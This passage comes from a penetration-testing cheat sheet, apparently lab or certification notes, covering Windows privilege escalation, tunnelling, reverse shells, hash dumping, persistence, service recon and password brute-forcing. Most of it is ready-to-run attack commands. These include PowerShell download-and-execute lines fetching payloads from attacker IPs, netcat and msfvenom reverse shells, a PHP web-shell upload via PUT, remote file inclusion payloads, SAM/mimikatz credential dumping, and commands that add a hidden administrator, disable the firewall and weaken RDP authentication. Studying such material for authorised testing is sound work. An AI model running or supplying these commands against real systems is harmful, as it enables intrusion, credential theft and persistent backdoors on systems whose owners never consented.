<p>Download <code>plink.exe</code></p>
<pre><code>C:\Users\Alfred&gt;powershell -c &quot;(New-Object System.Net.WebClient).DownloadFile('http://10.10.14.8/plink.exe', 'plink.exe')&quot;
</code></pre>
<p>Start SSH service on our attacking box.</p>
<pre><code>root@kali:~# service ssh start
</code></pre>
<p>Run <code>plink.exe</code></p>
<pre><code>C:\Users\Alfred&gt;plink.exe -l root -pw  -R 445:127.0.0.1:445 ATK_IP
</code></pre>
<p>Use <code>winexe</code> to get a shell</p>
<pre><code>root@kali:~# winexe -U Administrator //127.0.0.1 &quot;cmd.exe&quot;

or

psexec.py USER:PASSWORD@IP cmd.exe
</code></pre>
<h3><a class="header" href="#chisel" id="chisel">Chisel</a></h3>
<p>On the attacking machine start the server</p>
<pre><code>./chisel server -p 8081 -reverse
</code></pre>
<p>On the target machine start the listening client</p>
<pre><code>.\chisel.exe client 10.10.14.97:8081 R:8888:127.0.0.1:8888
</code></pre>
<h2><a class="header" href="#abusing-token-privileges-for-windows-local-privilege-escalation" id="abusing-token-privileges-for-windows-local-privilege-escalation">Abusing Token Privileges For Windows Local Privilege Escalation</a></h2>
<p>While using meterpreter</p>
<p>ps shows all of the running processes</p>
<pre><code>meterpreter &gt; migrate PID
to migrate to a higher authority process(ex: spoolsv.exe)

meterpreter &gt; load kiwi
to load mimikatz
</code></pre>
<p>TODO: Good reads</p>
<p>https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/</p>
<p>https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/</p>
<h2><a class="header" href="#windows-exploit-suggester" id="windows-exploit-suggester">Windows-Exploit-Suggester</a></h2>
<p>update the database</p>
<pre><code>$ ./windows-exploit-suggester.py --update
</code></pre>
<p>install dependencies</p>
<p>(install python-xlrd, $ pip install xlrd --upgrade)</p>
<p>feed it &quot;systeminfo&quot; input, and point it to the microsoft database</p>
<pre><code>$ ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt
</code></pre>
<p><a href="https://github.com/AonCyberLabs/Windows-Exploit-Suggester">Windows-Exploit-Suggester GitHub</a></p>
<h2><a class="header" href="#pass-the-hash-attack" id="pass-the-hash-attack">Pass the hash attack</a></h2>
<pre><code>pth-winexe -U administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //IP cmd.exe
</code></pre>
<h2><a class="header" href="#privilege-escalation-awesome-scripts-suite" id="privilege-escalation-awesome-scripts-suite">Privilege Escalation Awesome Scripts SUITE</a></h2>
<p><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">GitHub - carlospolop/privilege-escalation-awesome-scripts-suite: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)</a></p>
<h2><a class="header" href="#additional-reading-1" id="additional-reading-1">Additional reading</a></h2>
<p>FuzzySecurity | Windows Privilege Escalation Fundamentals</p>
<p><a href="https://www.fuzzysecurity.com/tutorials/16.html">FuzzySecurity | Windows Privilege Escalation Fundamentals</a><a href="https://www.fuzzysecurity.com/tutorials/16.html">FuzzySecurity | Windows Privilege Escalation Fundamentals</a></p>
<p>Windows Privilege Escalation Guide</p>
<p><a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/">Windows Privilege Escalation Guide</a></p>
<h1><a class="header" href="#reverse-shell-1" id="reverse-shell-1">Reverse Shell</a></h1>
<h2><a class="header" href="#batch-file" id="batch-file">Batch file</a></h2>
<pre><code>msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=4444 &gt; 1.bat

powershell -c &quot;IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))
</code></pre>
<h2><a class="header" href="#nishang--powershell" id="nishang--powershell">Nishang / Powershell</a></h2>
<p>Retrieve Invoke-PowerShellTcp.ps1 from the Nishang collection.</p>
<p>Edit the script and add the execution line at the end with IP and PORT</p>
<pre><code>c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://IP/Invoke-PoweShellTcp.ps1')
</code></pre>
<h3><a class="header" href="#powershell-download-and-execution" id="powershell-download-and-execution">Powershell download and execution</a></h3>
<pre><code>powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.9.134:8000/PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.9.134 -Port 9001
</code></pre>
<pre><code>powershell &quot;(New-Object System.Net.WebClient).Downloadfile('http://10.11.9.134:8000/bruce.exe','bruce.exe')&quot;
</code></pre>
<pre><code>powershell -c &quot;Invoke-WebRequest -Uri 'http://10.11.9.134:8000/bruce.exe' -OutFile 'C:\Windows\Temp\shell.exe'&quot;
</code></pre>
<pre><code>.\shell.exe
or
PS&gt; &amp; 'msdeploy.exe'
</code></pre>
<h2><a class="header" href="#netcat-reverse-shell" id="netcat-reverse-shell">Netcat reverse shell</a></h2>
<p>Upload nc.exe onto the target's machine (take note if 32 or 64 bits)</p>
<pre><code>nc.exe -nv IP PORT -e cmd.exe
nc64.exe -e cmd IP PORT
</code></pre>
<h2><a class="header" href="#upgrade-shell" id="upgrade-shell">Upgrade shell</a></h2>
<h3><a class="header" href="#msfconsole" id="msfconsole">MSFconsole</a></h3>
<pre><code>use multi/manage/shell_to_meterpreter

or 

use exploit/windows/local/payload_inject
</code></pre>
<h1><a class="header" href="#ntlm-hashes" id="ntlm-hashes">NTLM Hashes</a></h1>
<h2><a class="header" href="#dumping-hashes-with-secretsdumppy" id="dumping-hashes-with-secretsdumppy">Dumping Hashes with secretsdump.py</a></h2>
<p>https://github.com/SecureAuthCorp/impacket</p>
<h2><a class="header" href="#cracking-ntlm-hashes-with-hashcat" id="cracking-ntlm-hashes-with-hashcat">Cracking NTLM Hashes with Hashcat</a></h2>
<p>On Windows</p>
<pre><code>hashcat64.exe -m 1000 hashfile.txt rockyou.txt -O
</code></pre>
<h2><a class="header" href="#pass-the-hash" id="pass-the-hash">Pass the hash</a></h2>
<pre><code>pth-winexe -U Administrator%LMHASH:NTLMHASH //IP cmd
</code></pre>
<h1><a class="header" href="#maintaining-access" id="maintaining-access">Maintaining Access</a></h1>
<h3><a class="header" href="#generating-a-payload-w-msfvenom" id="generating-a-payload-w-msfvenom">Generating a Payload w/ msfvenom</a></h3>
<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe

use exploit/multi/handler

Background the meterpreter shell
</code></pre>
<h3><a class="header" href="#run-the-persistence-module" id="run-the-persistence-module">Run the Persistence Module</a></h3>
<pre><code>use exploit/windows/local/persistence

set session 1
</code></pre>
<p>If the system is shut down or reset for whatever reason you will lose your meterpreter session however by using the persistence module you create a backdoor into the system which you can access at any time using the metasploit <code>multi handler</code> and setting the payload to <code>windows/meterpreter/reverse_tcp</code> allowing you to send another meterpreter payload to the machine and open up a new meterpreter session.</p>
<h1><a class="header" href="#check-list-1" id="check-list-1">Check-list</a></h1>
<h2><a class="header" href="#info-sheet-1" id="info-sheet-1">Info-sheet</a></h2>
<ul>
<li>DNS-Domain name:</li>
<li>Host name:</li>
<li>OS:</li>
<li>Server:</li>
<li>Workgroup:</li>
<li>Windows domain:</li>
<li>Services and ports:</li>
</ul>
<p>INSERTTCPSCAN</p>
<h2><a class="header" href="#recon-1" id="recon-1">Recon</a></h2>
<pre><code>Always start with a stealthy scan to avoid closing ports.

# Syn-scan
nmap -sS INSERTIPADDRESS

# Service-version, default scripts, OS:
nmap INSERTIPADDRESS -sV -sC -O

# Scan all ports, might take a while.
nmap INSERTIPADDRESS -p-

# Scan for UDP
nmap INSERTIPADDRESS -sU
unicornscan -mU -v -I INSERTIPADDRESS

# Connect to udp if one is open
nc -u INSERTIPADDRESS 48772

# Monster scan
nmap INSERTIPADDRESS -p- -A -T4 -sC
</code></pre>
<h3><a class="header" href="#port-21---ftp-1" id="port-21---ftp-1">Port 21 - FTP</a></h3>
<ul>
<li>Name:</li>
<li>Version:</li>
<li>Anonymous login:</li>
</ul>
<p>INSERTFTPTEST</p>
<pre><code>nmap --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 INSERTIPADDRESS
</code></pre>
<h3><a class="header" href="#port-22---ssh-1" id="port-22---ssh-1">Port 22 - SSH</a></h3>
<ul>
<li>Name:</li>
<li>Version:</li>
<li>Protocol:</li>
<li>RSA-key-fingerprint:</li>
<li>Takes-password:
If you have usernames test login with username:username</li>
</ul>
<p>INSERTSSHCONNECT</p>
<h3><a class="header" href="#port-25-1" id="port-25-1">Port 25</a></h3>
<ul>
<li>Name:</li>
<li>Version:</li>
<li>VRFY:</li>
<li>EXPN:</li>
</ul>
<p>INSERTSMTPCONNECT</p>
<pre><code>nc -nvv INSERTIPADDRESS 25
HELO foo&lt;cr&gt;&lt;lf&gt;

nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 INSERTIPADDRESS
</code></pre>
<h3><a class="header" href="#port-110---pop3-1" id="port-110---pop3-1">Port 110 - Pop3</a></h3>
<ul>
<li>Name:</li>
<li>Version:</li>
</ul>
<p>INSERTPOP3CONNECT</p>
<h3><a class="header" href="#port-135---msrpc-1" id="port-135---msrpc-1">Port 135 - MSRPC</a></h3>
<p>Some versions are vulnerable.</p>
<pre><code>nmap INSERTIPADDRESS --script=msrpc-enum
</code></pre>
<p>Exploit:</p>
<pre><code>msf &gt; use exploit/windows/dcerpc/ms03_026_dcom
</code></pre>
<h3><a class="header" href="#port-139445---smb-1" id="port-139445---smb-1">Port 139/445 - SMB</a></h3>
<ul>
<li>Name:</li>
<li>Version:</li>
<li>Domain/workgroup name:</li>
<li>Domain-sid:</li>
<li>Allows unauthenticated login:</li>
</ul>
<pre><code>nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse INSERTIPADDRESS -p 445

enum4linux -a INSERTIPADDRESS

rpcclient -U &quot;&quot; INSERTIPADDRESS
	srvinfo
	enumdomusers
	getdompwinfo
	querydominfo
	netshareenum
	netshareenumall

smbclient -L INSERTIPADDRESS
smbclient //INSERTIPADDRESS/tmp
smbclient \\\\INSERTIPADDRESS\\ipc$ -U john
smbclient //INSERTIPADDRESS/ipc$ -U john
smbclient //INSERTIPADDRESS/admin$ -U john

Log in with shell:
winexe -U username //INSERTIPADDRESS &quot;cmd.exe&quot; --system

</code></pre>
<h3><a class="header" href="#port-161162-udp---snmp-1" id="port-161162-udp---snmp-1">Port 161/162 UDP - SNMP</a></h3>
<pre><code>nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes INSERTIPADDRESS
snmp-check -t INSERTIPADDRESS -c public
</code></pre>
<pre><code># Common community strings
public
private
community
</code></pre>
<h3><a class="header" href="#port-554---rtsp-1" id="port-554---rtsp-1">Port 554 - RTSP</a></h3>
<h3><a class="header" href="#port-1030103210331038-1" id="port-1030103210331038-1">Port 1030/1032/1033/1038</a></h3>
<p>Used by RPC to connect in domain network. Usually nothing.</p>
<h3><a class="header" href="#port-1433---mssql" id="port-1433---mssql">Port 1433 - MSSQL</a></h3>
<ul>
<li>Version:</li>
</ul>
<pre><code>use auxiliary/scanner/mssql/mssql_ping

# Last options. Brute force.
scanner/mssql/mssql_login

# Log in to mssql
sqsh -S INSERTIPADDRESS -U sa

# Execute commands
xp_cmdshell 'date'
go
</code></pre>
<p>If you have credentials look in metasploit for other modules.</p>
<h2><a class="header" href="#port-1521---oracle-1" id="port-1521---oracle-1">Port 1521 - Oracle</a></h2>
<p>Name:
Version:
Password protected:</p>
<pre><code>tnscmd10g version -h INSERTIPADDRESS
tnscmd10g status -h INSERTIPADDRESS
</code></pre>
<h3><a class="header" href="#port-2100---oracle-xml-db-1" id="port-2100---oracle-xml-db-1">Port 2100 - Oracle XML DB</a></h3>
<p>Can be accessed through ftp.
Some default passwords here: https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm</p>
<ul>
<li>Name:</li>
<li>Version:</li>
</ul>
<p>Default logins:</p>
<pre><code>sys:sys
scott:tiger
</code></pre>
<h3><a class="header" href="#port-2049---nfs-1" id="port-2049---nfs-1">Port 2049 - NFS</a></h3>
<pre><code>showmount -e INSERTIPADDRESS

If you find anything you can mount it like this:

mount INSERTIPADDRESS:/ /tmp/NFS
mount -t INSERTIPADDRESS:/ /tmp/NFS
</code></pre>
<h3><a class="header" href="#3306---mysql-1" id="3306---mysql-1">3306 - MySQL</a></h3>
<ul>
<li>Name:</li>
<li>Version:</li>
</ul>
<pre><code>mysql --host=INSERTIPADDRESS -u root -p

nmap -sV -Pn -vv -script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 INSERTIPADDRESS -p 3306
</code></pre>
<h3><a class="header" href="#port-3339---oracle-web-interface-1" id="port-3339---oracle-web-interface-1">Port 3339 - Oracle web interface</a></h3>
<ul>
<li>Basic info about web service (apache, nginx, IIS)</li>
<li>Server:</li>
<li>Scripting language:</li>
<li>Apache Modules:</li>
<li>IP-address:</li>
<li>Domain-name address:</li>
</ul>
<h3><a class="header" href="#port-3389---remote-desktop" id="port-3389---remote-desktop">Port 3389 - Remote desktop</a></h3>
<p>Test logging in to see what OS is running</p>
<pre><code>rdesktop -u guest -p guest INSERTIPADDRESS -g 94%

# Brute force
ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://INSERTIPADDRESS
</code></pre>
<h3><a class="header" href="#port-80" id="port-80">Port 80</a></h3>
<ul>
<li>Server:</li>
<li>Scripting language:</li>
<li>Apache Modules:</li>
<li>Domain-name address:</li>
</ul>
<p>INSERTCURLHEADER</p>
<ul>
<li>Web application</li>
<li>Name:</li>
<li>Version:</li>
</ul>
<pre><code># Nikto
nikto -h http://INSERTIPADDRESS

# Nikto with squid proxy
nikto -h INSERTIPADDRESS -useproxy http://INSERTIPADDRESS:4444

# Get header
curl -i INSERTIPADDRESS

# Get everything
curl -i -L INSERTIPADDRESS

# Check if it is possible to upload using put
curl -v -X OPTIONS http://INSERTIPADDRESS/
curl -v -X PUT -d '&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;' http://INSERTIPADDRESS/test/shell.php

# Check for title and all links
dotdotpwn.pl -m http -h INSERTIPADDRESS -M GET -o unix
</code></pre>
<h4><a class="header" href="#nikto-scan-1" id="nikto-scan-1">Nikto scan</a></h4>
<p>INSERTNIKTOSCAN</p>
<h4><a class="header" href="#url-brute-force-1" id="url-brute-force-1">Url brute force</a></h4>
<pre><code># Dirb
dirb http://INSERTIPADDRESS -r -o dirb-INSERTIPADDRESS.txt

# Gobuster - remove relevant responde codes (403 for example)
gobuster -u http://INSERTIPADDRESS -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e
</code></pre>
<p>INSERTDIRBSCAN</p>
<h4><a class="header" href="#defaultweak-login-1" id="defaultweak-login-1">Default/Weak login</a></h4>
<p>Google documentation for default passwords and test them:</p>
<pre><code>site:webapplication.com password
</code></pre>
<pre><code>admin admin
admin password
admin &lt;blank&gt;
admin nameofservice
root root
root admin
root password
root nameofservice
&lt;username if you have&gt; password
&lt;username if you have&gt; admin
&lt;username if you have&gt; username
&lt;username if you have&gt; nameofservice
</code></pre>
<h4><a class="header" href="#lfirfi-1" id="lfirfi-1">LFI/RFI</a></h4>
<pre><code># Kadimus
/root/Tools/Kadimus/kadimus -u http://INSERTIPADDRESS/example.php?page=


# Bypass execution
http://INSERTIPADDRESS/index.php?page=php://filter/convert.base64-encode/resource=index
base64 -d savefile.php

# Bypass extension
http://INSERTIPADDRESS/page=http://192.168.1.101/maliciousfile.txt%00
http://INSERTIPADDRESS/page=http://192.168.1.101/maliciousfile.txt?
</code></pre>
<h4><a class="header" href="#sql-injection-1" id="sql-injection-1">SQL-Injection</a></h4>
<pre><code># Post
./sqlmap.py -r search-test.txt -p tfUPass

# Get
sqlmap -u &quot;http://INSERTIPADDRESS/index.php?id=1&quot; --dbms=mysql

# Crawl
sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3
</code></pre>
<h4><a class="header" href="#sql-login-bypass-1" id="sql-login-bypass-1">Sql-login-bypass</a></h4>
<ul>
<li>Open Burp-suite</li>
<li>Make and intercept request</li>
<li>Send to intruder</li>
<li>Cluster attack</li>
<li>Paste in sqlibypass-list (https://bobloblaw.gitbooks.io/security/content/sql-injections.html)</li>
<li>Attack</li>
<li>Check for response length variation</li>
</ul>
<h3><a class="header" href="#password-brute-force---last-resort-1" id="password-brute-force---last-resort-1">Password brute force - last resort</a></h3>
<pre><code>cewl
</code></pre>
<h3><a class="header" href="#port-443---https-1" id="port-443---https-1">Port 443 - HTTPS</a></h3>
<p>Heartbleed:</p>
<pre><code>sslscan INSERTIPADDRESS:443
</code></pre>
<h2><a class="header" href="#vulnerability-analysis-1" id="vulnerability-analysis-1">Vulnerability analysis</a></h2>
<p>Now we have gathered information about the system. Now comes the part where we look for exploits and vulnerabilities and features.</p>
<h3><a class="header" href="#to-try---list-of-possibilities" id="to-try---list-of-possibilities">To try - List of possibilities</a></h3>
<p>Add possible exploits here:</p>
<h3><a class="header" href="#find-sploits---searchsploit-and-google-1" id="find-sploits---searchsploit-and-google-1">Find sploits - Searchsploit and google</a></h3>
<p>Where there are many exploits for a software, use google. It will automatically sort it by popularity.</p>
<pre><code>site:exploit-db.com apache 2.4.7

# Remove dos-exploits

searchsploit Apache 2.4.7 | grep -v '/dos/'
searchsploit Apache | grep -v '/dos/' | grep -vi &quot;tomcat&quot;

# Only search the title (exclude the path), add the -t
searchsploit -t Apache | grep -v '/dos/'
</code></pre>
<hr />
<p>'''''''''''''''''''''''''''''''''' PRIVESC '''''''''''''''''''''''''''''''''</p>
<hr />
<h2><a class="header" href="#privilege-escalation-1" id="privilege-escalation-1">Privilege escalation</a></h2>
<p>Now we start the whole enumeration-process over gain. This is a checklist. You need to check of every single one, in this order.</p>
<ul>
<li>Kernel exploits</li>
<li>Cleartext password</li>
<li>Reconfigure service parameters</li>
<li>Inside service</li>
<li>Program running as root</li>
<li>Installed software</li>
<li>Scheduled tasks</li>
<li>Weak passwords</li>
</ul>
<h3><a class="header" href="#to-try-list-1" id="to-try-list-1">To-try list</a></h3>
<p>Here you will add all possible leads. What to try.</p>
<h3><a class="header" href="#basic-info-1" id="basic-info-1">Basic info</a></h3>
<ul>
<li>OS:</li>
<li>Version:</li>
<li>Architecture:</li>
<li>Current user:</li>
<li>Hotfixes:</li>
<li>Antivirus:</li>
</ul>
<p><strong>Users:</strong></p>
<p><strong>Localgroups:</strong></p>
<pre><code>systeminfo
set
hostname
net users
net user user1
net localgroups
accesschk.exe -uwcqv &quot;Authenticated Users&quot; *

netsh firewall show state
netsh firewall show config

# Set path
set PATH=%PATH%;C:\xampp\php
</code></pre>
<h3><a class="header" href="#kernel-exploits-1" id="kernel-exploits-1">Kernel exploits</a></h3>
<pre><code># Look for hotfixes
systeminfo

wmic qfe get Caption,Description,HotFixID,InstalledOn

# Search for exploits
site:exploit-db.com windows XX XX
</code></pre>
<h3><a class="header" href="#cleartext-passwords" id="cleartext-passwords">Cleartext passwords</a></h3>
<pre><code># Windows autologin
reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon&quot;

# VNC
reg query &quot;HKCU\Software\ORL\WinVNC3\Password&quot;

# SNMP Parameters
reg query &quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot;

# Putty
reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
</code></pre>
<h3><a class="header" href="#reconfigure-service-parameters" id="reconfigure-service-parameters">Reconfigure service parameters</a></h3>
<ul>
<li>Unquoted service paths</li>
</ul>
<p>Check book for instructions</p>
<ul>
<li>Weak service permissions</li>
</ul>
<p>Check book for instructions</p>
<h3><a class="header" href="#inside-service-1" id="inside-service-1">Inside service</a></h3>
<p>Check netstat to see what ports are open from outside and from inside. Look for ports only available on the inside.</p>
<pre><code># Meterpreter
run get_local_subnets

netstat /a
netstat -ano
</code></pre>
<h3><a class="header" href="#programs-running-as-rootsystem" id="programs-running-as-rootsystem">Programs running as root/system</a></h3>
<h3><a class="header" href="#installed-software-1" id="installed-software-1">Installed software</a></h3>
<pre><code># Metasploit
ps

tasklist /SVC
net start
reg query HKEY_LOCAL_MACHINE\SOFTWARE
DRIVERQUERY

Look in:
C:\Program files
C:\Program files (x86)
Home directory of the user
</code></pre>
<h3><a class="header" href="#scheduled-tasks" id="scheduled-tasks">Scheduled tasks</a></h3>
<pre><code>schtasks /query /fo LIST /v

Check this file:
c:\WINDOWS\SchedLgU.Txt
</code></pre>
<h3><a class="header" href="#weak-passwords" id="weak-passwords">Weak passwords</a></h3>
<p>Remote desktop</p>
<pre><code>ncrack -vv --user george -P /root/oscp/passwords.txt rdp://INSERTIPADDRESS
</code></pre>
<h3><a class="header" href="#useful-commands-2" id="useful-commands-2">Useful commands</a></h3>
<p><strong>Add user and enable RDP</strong></p>
<pre><code>net user haxxor Haxxor123 /add
net localgroup Administrators haxxor /add
net localgroup &quot;Remote Desktop Users&quot; haxxor /ADD

# Enable RDP
reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f

Turn firewall off
netsh firewall set opmode disable

Or like this
reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f

If you get this error:

&quot;ERROR: CredSSP: Initialize failed, do you have correct kerberos tgt initialized ?
Failed to connect, CredSSP required by server.&quot;&quot;

Add this reg key:

reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0 /f
</code></pre>
<hr />
<p>----------------------------- LOOT LOOT LOOT LOOT -------------------</p>
<hr />
<h2><a class="header" href="#loot-1" id="loot-1">Loot</a></h2>
<ul>
<li>Proof:</li>
<li>Network secret:</li>
<li>Password and hashes:</li>
<li>Dualhomed:</li>
<li>Tcpdump:</li>
<li>Interesting files:</li>
<li>Databases:</li>
<li>SSH-keys:</li>
<li>Browser:</li>
</ul>
<h3><a class="header" href="#proof-1" id="proof-1">Proof</a></h3>
<h3><a class="header" href="#network-secret-1" id="network-secret-1">Network secret</a></h3>
<h3><a class="header" href="#passwords-and-hashes-1" id="passwords-and-hashes-1">Passwords and hashes</a></h3>
<pre><code>wce32.exe -w
wce64.exe -w
fgdump.exe

reg.exe save hklm\sam c:\sam_backup
reg.exe save hklm\security c:\security_backup
reg.exe save hklm\system c:\system

# Meterpreter
hashdump
load mimikatz
msv
</code></pre>
<h3><a class="header" href="#dualhomed-1" id="dualhomed-1">Dualhomed</a></h3>
<pre><code>ipconfig /all
route print

# What other machines have been connected
arp -a
</code></pre>
<h3><a class="header" href="#tcpdump-1" id="tcpdump-1">Tcpdump</a></h3>
<pre><code># Meterpreter
run packetrecorder -li
run packetrecorder -i 1
</code></pre>
<h3><a class="header" href="#interesting-files-1" id="interesting-files-1">Interesting files</a></h3>
<pre><code>#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql

# How to cat files in meterpreter
cat c:\\Inetpub\\iissamples\\sdk\\asp\\components\\adrot.txt

# Recursive search
dir /s
</code></pre>
<h3><a class="header" href="#mail-1" id="mail-1">Mail</a></h3>
<h3><a class="header" href="#browser-1" id="browser-1">Browser</a></h3>
<ul>
<li>Browser start-page:</li>
<li>Browser-history:</li>
<li>Saved passwords:</li>
</ul>
<h3><a class="header" href="#databases-1" id="databases-1">Databases</a></h3>
<h3><a class="header" href="#ssh-keys-2" id="ssh-keys-2">SSH-keys</a></h3>
<h2><a class="header" href="#how-to-replicate-1" id="how-to-replicate-1">How to replicate:</a></h2>
<h1><a class="header" href="#brute-force" id="brute-force">Brute-Force</a></h1>
<h2><a class="header" href="#hydra" id="hydra">Hydra</a></h2>
<pre><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.45.36 http-post-form &quot;$Link$/login.aspx?ReturnURL=/admin:$COOKIE$:LOGIN FAIL MESSAGE&quot; -vv

sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form &quot;/department/login.php:username=admin&amp;password=^PASS^:Invalid Password!&quot;
</code></pre>
<table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody>
<tr><td>hydra -P wordlist -v ip protocol</td><td>Brute force against a protocol of your choice</td></tr>
<tr><td>hydra -v -V -u -L username_list -P password_list -t 1 -u ip protocol</td><td>You can use Hydra to bruteforce usernames as well as passwords. It will loop through every combination in your lists. (-vV = verbose mode, showing login attempts)</td></tr>
<tr><td>hydra -t 1 -V -f -l username -P wordlist rdp://<ip></td><td>Attack a Windows Remote Desktop with a password list.</td></tr>
<tr><td>hydra -l username -P password list $ip -V http-form-post '/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log In&amp;testcookie=1:S=Location'</td><td>Craft a more specific request for Hydra to brute force.</td></tr>
</tbody></table>
<pre><code>&quot;hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp&quot;

Let's break it down:

SECTION             FUNCTION

hydra                   Runs the hydra tool
-t 4                    Number of parallel connections per target
-l [user]               Points to the user who's account you're trying to compromise
-P [path to dictionary] Points to the file containing the list of possible passwords
-vV                     Sets verbose mode to very verbose, shows the login+pass combination for each attempt
[machine IP]            The IP address of the target machine
ftp / protocol          Sets the protocol
</code></pre>
<h3><a class="header" href="#basic-http-auth" id="basic-http-auth">Basic HTTP auth</a></h3>
<pre><code>hydra -l USER -P /usr/share/wordlists/rockyou.txt -s PORT -f 10.10.93.125 http-get /PATH
</code></pre>
<h2><a class="header" href="#brute-force-ssh-with-medusa" id="brute-force-ssh-with-medusa">Brute force ssh with medusa</a></h2>
<pre><code>medusa -h IP -U users.txt -P passwords.txt -M ssh IP
</code></pre>
<h2><a class="header" href="#brute-force-su-with-sucrack" id="brute-force-su-with-sucrack">Brute force su with sucrack</a></h2>
<pre><code>sucrack -a -w 20 -s 10 -u user pass.txt
</code></pre>
<h2><a class="header" href="#brute-force-ssh-key-with-john" id="brute-force-ssh-key-with-john">Brute force ssh key with John</a></h2>
<pre><code>/usr/share/john/ssh2john.py id_rsa &gt; for_john.txt

john for_john.txt --wordlist=rockyou.txt
</code></pre>
<h2><a class="header" href="#brute-force-windows-login" id="brute-force-windows-login">Brute force Windows login</a></h2>
<pre><code>msf5 auxiliary(scanner/winrm/winrm_login) &gt; set PASSWORD '$fab@s3Rv1ce$1'                                                                
PASSWORD =&gt; $fab@s3Rv1ce$1                                                                    
msf5 auxiliary(scanner/winrm/winrm_login) &gt; set USER_FILE users                                                                                  
USER_FILE =&gt; users                                                                                            
msf5 auxiliary(scanner/winrm/winrm_login) &gt; set RHOSTS 10.10.10.193                                                                                       
RHOSTS =&gt; 10.10.10.193                                                                                                                         
msf5 auxiliary(scanner/winrm/winrm_login) &gt; run  
</code></pre>
<h1><a class="header" href="#enumeration-1" id="enumeration-1">Enumeration</a></h1>
<h2><a class="header" href="#finding-subdomains-with-assetfinder" id="finding-subdomains-with-assetfinder">Finding Subdomains with Assetfinder</a></h2>
<pre><code>go get -u github.com/tomnomnom/assetfinder
</code></pre>
<pre><code>assetfinder tesla.com &amp;gt;&amp;gt; tesla-subs.txt
</code></pre>
<h2><a class="header" href="#finding-subdomains-with-amass" id="finding-subdomains-with-amass">Finding Subdomains with Amass</a></h2>
<pre><code>export GO111MODULE=on

go get -v github.com/OWASP/Amass/v3/...

amass enum -d tesla.com
</code></pre>
<h2><a class="header" href="#finding-subdomains-with-wfuzz" id="finding-subdomains-with-wfuzz">Finding Subdomains with WFuzz</a></h2>
<pre><code>sudo wfuzz -c -f sub-fighter -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://10.10.10.197/' -H &quot;Host: FUZZ.sneakycorp.htb&quot; --hw 290
</code></pre>
<h2><a class="header" href="#finding-alive-domains-with-httprobe" id="finding-alive-domains-with-httprobe">Finding Alive Domains with Httprobe</a></h2>
<pre><code>go get -u github.com/tomnomnom/httprobe
</code></pre>
<p>Sort domains and find out which are alive.</p>
<h2><a class="header" href="#enumerating-httphttps" id="enumerating-httphttps">Enumerating HTTP/HTTPS</a></h2>
<h3><a class="header" href="#gobuster" id="gobuster">GoBuster</a></h3>
<pre><code>gobuster dir -u http://IP -w wordlist -o gobuster.log -t 50
-x for extension (-x php)
-c for cookie ( -c 'PHPSESSID=3852937265978')
</code></pre>
<p>-s 302,307...403 to add status codes
-x sh,pl to add file extensions
-k to ignore ssl certificate</p>
<h4><a class="header" href="#wordlists" id="wordlists">Wordlists</a></h4>
<pre><code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/wordlists/dirb/small
</code></pre>
<h3><a class="header" href="#nikto" id="nikto">Nikto</a></h3>
